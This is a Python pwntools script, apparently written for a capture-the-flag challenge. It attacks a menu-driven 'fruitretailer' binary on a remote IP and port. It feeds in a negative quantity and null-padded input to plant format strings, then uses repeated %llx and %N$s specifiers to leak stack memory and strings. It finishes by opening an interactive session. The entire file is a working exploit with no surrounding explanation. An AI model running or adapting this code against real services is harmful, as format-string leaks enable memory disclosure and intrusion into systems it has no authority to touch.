from pwn import *

def fsa(format_string):
	fsa.called_num += 1

	assert(len(format_string) < 0x1f)

	r.sendlineafter('Your choice:', '1')
	r.sendlineafter('Would you like to buy apple (1) or banana (2)?:', '2')
	r.sendlineafter('Enter quantity:', '-1')
	r.sendlineafter('Would you like to specify the shipping address? (Y/N)', 'Y', 1)
	r.sendline('\x00' * 0x40 + format_string)

	r.sendlineafter('Your choice:', '3')
	r.sendlineafter('Enter index of packet to change:', str(fsa.called_num))
	r.sendlineafter('Enter new label:', '\x00' * 10)

	r.sendlineafter('Your choice:', '2')
	for _ in xrange(fsa.called_num):
		r.recvuntil('65531|')
	return r.recvline()
fsa.called_num = 0

# r = process('./fruitretailer')
r = remote('125.235.240.167', 5000)

log.info(fsa('%llx %llx %llx %llx %llx %llx'))
log.info(fsa('%7$llx %8$llx %9$llx %10$llx'))
# for i in xrange(15):
# 	log.info(fsa('%{}$llx %{}$llx %{}$llx'.format(i * 3 + 11, i * 3 + 12, i * 3 + 13)))
log.info(fsa('%41$s'))
log.info(fsa('%43$s'))
for i in xrange(11, 13):
	log.info(fsa('%{}$s %{}$s %{}$s'.format(i * 3 + 11, i * 3 + 12, i * 3 + 13)))
log.info(fsa('%50$s %51$s'))

r.interactive()
